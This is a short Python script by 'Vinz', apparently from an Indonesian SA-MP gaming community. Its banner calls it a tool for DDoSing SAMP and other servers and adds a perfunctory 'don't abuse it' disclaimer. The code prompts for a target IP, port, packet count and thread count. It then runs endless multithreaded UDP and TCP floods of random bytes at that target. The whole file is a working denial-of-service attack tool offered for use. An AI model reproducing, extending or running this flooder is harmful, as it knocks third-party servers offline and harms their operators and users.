#!/usr/bin/env python3
#By Vinz
import os
import threading
import sys
import struct
import random
import time
import socket

os.system("clear")
print("""
\033[91m
    TOOLS INI UNTUK DDOS SERVER SAMP/LAINNYA 
          JADI JANGAN DI SALAH GUNAKAN
                                              
                    TOOLS BY VINZ-SAMP
                    JANJI GA ABUSE !
""")
choice = str(input("\033[96m=====> Yakin? (y/n) : "))
ip = str(input("=====> IP Target    : "))
port = int(input("=====> Port Target  : "))
times = int(input("=====> $ Kirim PACKETS : "))
threads = int(input("=====> $ Kirim THREADS : "))
def vinz():
	data = random._urandom(577)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m VINZ-SAMP DATANG MENYERANG !!!")
		except:
			print("\033[91m [!] VINZ-SAMP COMMUNITY DATANG MENYERANG!!!")

def vinz2():
	data = random._urandom(1025)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m VINZ-SAMP COMMUNITY DATANG MENYERANG !!!")
		except:
			s.close()
			print("\033[91m [*] VINZ-SAMP COMMUNITY DATANG MENYERANG!!!")

def vinz3():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m VINZ-SAMP COMMUNITY DATANG MENYERANG !!!")
		except:
			print("\033[91m [!] VINZ-SAMP COMMUNITY DATANG MENYERANG!!!")

def vinz4():
	data = random._urandom(1705)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m VINZ-SAMP COMMUNITY DATANG MENYERANG !!!")
		except:
			print("\033[91m [!] VINZ-SAMP COMMUNITY DATANG MENYERANG!!!")

for y in range(threads):

	if choice == 'y':

		th = threading.Thread(target = vinz)
		th.start()
		th = threading.Thread(target = vinz2)
		th.start()
		th = threading.Thread(target = vinz3)
		th.start()
	else:
		th = threading.Thread(target = vinz4)
		th.start()
